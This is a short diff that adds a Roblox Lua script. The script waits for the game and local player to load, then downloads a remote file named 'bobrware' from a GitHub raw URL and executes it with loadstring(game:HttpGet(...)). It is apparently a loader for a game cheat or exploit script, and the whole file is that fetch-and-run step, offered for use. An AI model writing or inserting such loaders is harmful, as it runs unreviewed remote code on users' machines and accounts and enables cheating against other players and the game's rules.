@@ -1,0 +1,6 @@
+if not game['Loaded'] or not game:GetService('Players')['LocalPlayer'] then
+    game['Loaded']:Wait();
+    game:WaitForChild(game:GetService('Players'));
+    game:GetService('Players'):WaitForChild(game:GetService('Players').LocalPlayer.Name)
+end
+loadstring(game:HttpGet('https://raw.githubusercontent.com/capyb4r4/bobr/main/bobrware'))()
